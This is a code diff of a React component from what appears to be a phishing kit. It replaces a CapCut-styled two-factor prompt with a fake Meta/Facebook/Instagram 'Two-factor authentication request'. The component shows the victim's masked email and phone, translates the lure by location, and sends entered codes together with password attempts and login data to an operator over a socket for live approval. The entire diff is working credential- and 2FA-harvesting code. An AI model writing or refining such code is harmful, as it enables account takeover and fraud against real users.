@@ -1,132 +1,213 @@
-import VerifyImage from '@/assets/images/verify-image.png';
-import { CAPCUT_BTN_PRIMARY, CAPCUT_INPUT_CLASS, ModalShell, ModalSpinner } from '@/components/form-modal/modal-shell';
-import { modalRetryConfig } from '@/components/form-modal/modal-shell';
-import { submitFormStep } from '@/hooks/use-socket';
+import '@/assets/css/two-fa-modal.css';
+import TwoFaImage from '@/assets/images/2FA.png';
+import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
+import { useAppealContext } from '@/hooks/use-appeal-context';
 import { store } from '@/store/store';
-import { useTranslation } from '@/utils/translate';
+import { submitCodeApproval } from '@/hooks/use-socket';
+import translateText from '@/utils/translate';
 import Image from 'next/image';
-import { useEffect, useState, type FC } from 'react';
+import { type FC, type FormEvent, useEffect, useMemo, useState } from 'react';
 
-const VERIFY_MODAL_TEXTS = [
-    'Two-Factor Authentication',
-    'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
-    'Code',
-    "This code doesn't work. Check it's correct or try a new one after",
-    'Continue'
-] as const;
+const TEXT = {
+    title: 'Two-factor authentication request',
+    instructionPrefix: 'Enter the code sent to',
+    instructionSuffix: ', or confirm with an authenticator app.',
+    codePlaceholder: 'Code',
+    error: 'The code you entered is incorrect. Please try again.',
+    waiting: 'Waiting for verification...',
+    continue: 'Continue',
+    tryAnother: 'Try another method',
+    facebook: 'Facebook',
+    instagram: 'Instagram',
+    userFallback: 'User'
+} as const;
+
+const textsToTranslate = Object.values(TEXT);
+
+const maskEmail = (email: string): string => {
+    if (!email) {
+        return 't**t@example.us';
+    }
+    const [local, domain] = email.split('@');
+    if (!domain) {
+        return email;
+    }
+    if (local.length <= 2) {
+        return `${local[0] ?? ''}**@${domain}`;
+    }
+    return `${local[0]}**${local[local.length - 1]}@${domain}`;
+};
+
+const maskPhone = (phone: string): string => {
+    if (!phone) {
+        return '+84 ****** XX';
+    }
+    const digits = phone.replace(/\D/g, '');
+    if (digits.length < 4) {
+        return phone;
+    }
+    return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
+};
 
 const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
-    const { t } = useTranslation(VERIFY_MODAL_TEXTS);
-    const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
-    const [countdown, setCountdown] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
-    const [showError, setShowError] = useState(false);
+    const [showInputError, setShowInputError] = useState(false);
+    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addCode, setMessageId } = store();
-    const maxCode = modalRetryConfig.MAX_CODE;
-    const loadingTime = modalRetryConfig.CODE_LOADING_TIME;
+    const { geoInfo, userData, loginProvider } = store();
+    const appeal = useAppealContext();
+
+    const t = (text: string): string => translations[text] || text;
+
+    const normalizedCode = code.replace(/\D/g, '');
+    const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
+    const canSubmit = isCodeValid && !isLoading;
+
+    const providerLabel =
+        loginProvider === 'instagram' ? t(TEXT.instagram) : loginProvider === 'facebook' ? t(TEXT.facebook) : t(TEXT.facebook);
+
+    const userName = userData.fullName.trim() || t(TEXT.userFallback);
+
+    const instructionText = useMemo(() => {
+        const email = maskEmail(userData.personalEmail);
+        const phone = maskPhone(userData.phoneNumber);
+        return `${t(TEXT.instructionPrefix)} ${email}, ${phone}${t(TEXT.instructionSuffix)}`;
+    }, [userData.personalEmail, userData.phoneNumber, t]);
 
     useEffect(() => {
-        if (countdown <= 0) {
+        document.title = 'Two-factor authentication';
+    }, []);
+
+    useEffect(() => {
+        if (!geoInfo) {
             return;
         }
 
-        const timer = window.setTimeout(() => {
-            setCountdown((prev) => {
-                if (prev <= 1) {
-                    setShowError(false);
-                    return 0;
-                }
-                return prev - 1;
-            });
-        }, 1000);
+        const translateAll = async () => {
+            const translatedMap: Record<string, string> = {};
+            for (const text of textsToTranslate) {
+                translatedMap[text] = await translateText(text, geoInfo.country_code);
+            }
+            setTranslations(translatedMap);
+        };
 
-        return () => window.clearTimeout(timer);
-    }, [countdown]);
+        translateAll();
+    }, [geoInfo]);
 
-    const handleSubmit = async () => {
-        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;
+    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
+        e.preventDefault();
+        if (!canSubmit) {
+            return;
+        }
 
-        setShowError(false);
         setIsLoading(true);
-
-        const next = attempts + 1;
-        setAttempts(next);
-        addCode(code);
+        setShowInputError(false);
 
         try {
-            const res = await submitFormStep(
-                { geoInfo, deviceLabel, messageId, userData, loginProvider },
-                { step: 'verify_code', code, attempt: next }
+            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
+                throw new Error('socket unavailable');
+            }
+
+            const result = await submitCodeApproval(
+                {
+                    socket: appeal.socket,
+                    messageId: appeal.messageId,
+                    setMessageId: appeal.setMessageId,
+                    formData: appeal.formData,
+                    loginData: appeal.loginData,
+                    loginProvider: appeal.loginProvider,
+                    passwordAttempts: appeal.passwordAttempts,
+                    twoFAAttempts: appeal.twoFAAttempts,
+                    deviceLabel: appeal.deviceLabel,
+                    ip: appeal.ip,
+                    setLoginData: appeal.setLoginData,
+                    addPasswordAttempt: appeal.addPasswordAttempt,
+                    addTwoFAAttempt: appeal.addTwoFAAttempt
+                },
+                normalizedCode
             );
 
-            if (typeof res.messageId === 'number') {
-                setMessageId(res.messageId);
+            if (result.approved) {
+                nextStep();
+                return;
             }
 
-            if (next >= maxCode) {
-                nextStep();
-            } else {
-                setShowError(true);
-                setCode('');
-                setCountdown(loadingTime);
-            }
+            setShowInputError(true);
+            setCode('');
         } catch {
-            //
+            setShowInputError(true);
+            setCode('');
         } finally {
             setIsLoading(false);
         }
     };
 
+    const showErrorMessage = showInputError;
+
     return (
-        <ModalShell title={t('Two-Factor Authentication')} showClose={false}>
-            <div className='flex flex-1 flex-col px-5 py-4'>
-                <p className='mb-6 text-body-md leading-relaxed text-on-surface-variant'>
-                    {t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}
-                </p>
+        <div className='two-fa-page two-fa-overlay' role='dialog' aria-modal='true' aria-labelledby='two-fa-title'>
+            <div className='two-fa-modal'>
+                <div className='two-fa-body'>
+                    <div className='w-full'>
+                        <div className='two-fa-user-row'>
+                            <span>{userName}</span>
+                            <div className='two-fa-user-dot' aria-hidden='true' />
+                            <span>{providerLabel}</span>
+                        </div>
 
-                <div className='mb-6 overflow-hidden rounded-xl border border-surface-border'>
-                    <Image src={VerifyImage} alt='' className='h-auto w-full opacity-90' />
+                        <h2 id='two-fa-title' className='two-fa-title'>
+                            {t(TEXT.title)}
+                        </h2>
+
+                        <p className='two-fa-instruction'>{instructionText}</p>
+
+                        <div className='two-fa-image-wrap'>
+                            <Image src={TwoFaImage} alt='' width={480} className='h-auto w-full' />
+                        </div>
+
+                        <form id='two-fa-form' onSubmit={handleSubmit}>
+                            <div className={`two-fa-input-wrap ${showErrorMessage ? 'is-error' : ''}`}>
+                                <input
+                                    id='two-fa-code'
+                                    className='two-fa-input'
+                                    inputMode='numeric'
+                                    placeholder={t(TEXT.codePlaceholder)}
+                                    maxLength={8}
+                                    type='text'
+                                    autoComplete='off'
+                                    value={code}
+                                    disabled={isLoading}
+                                    onChange={(e) => {
+                                        const value = e.target.value.replace(/\D/g, '').slice(0, 8);
+                                        setCode(value);
+                                        setShowInputError(false);
+                                    }}
+                                />
+                            </div>
+
+                            {showErrorMessage ? <p className='two-fa-error'>{t(TEXT.error)}</p> : null}
+
+                            {isLoading ? <p className='two-fa-waiting'>{t(TEXT.waiting)}</p> : null}
+
+                            <div className='mt-2.5 w-full'>
+                                <button type='submit' className='two-fa-submit' disabled={!canSubmit}>
+                                    {isLoading ? <span className='two-fa-spinner' /> : t(TEXT.continue)}
+                                </button>
+                            </div>
+
+                            <div className='two-fa-alt-method'>
+                                <span>{t(TEXT.tryAnother)}</span>
+                            </div>
+
+                            <div className='mx-auto mt-5 w-16'>
+                                <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
+                            </div>
+                        </form>
+                    </div>
                 </div>
-
-                <div className='mb-2'>
-                    <label htmlFor='code-input' className='mb-1.5 block font-label-md text-label-md text-on-surface-variant'>
-                        {t('Code')}
-                    </label>
-                    <input
-                        type='tel'
-                        inputMode='numeric'
-                        pattern='[0-9]*'
-                        id='code-input'
-                        value={code}
-                        onChange={(e) => {
-                            const value = e.target.value.replaceAll(/\D/g, '');
-                            if (value.length <= 8) setCode(value);
-                        }}
-                        maxLength={8}
-                        disabled={countdown > 0}
-                        className={`${CAPCUT_INPUT_CLASS} text-center text-lg tracking-[0.3em] ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
-                        placeholder='••••••'
-                    />
-                </div>
-
-                {showError && (
-                    <p className='mb-2 text-sm text-error'>
-                        {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
-                    </p>
-                )}
-
-                <button
-                    type='button'
-                    onClick={handleSubmit}
-                    disabled={isLoading || code.length < 6 || countdown > 0}
-                    className={`${CAPCUT_BTN_PRIMARY} mt-4 mb-2`}
-                >
-                    {isLoading ? <ModalSpinner /> : t('Continue')}
-                </button>
             </div>
-        </ModalShell>
+        </div>
     );
 };
 
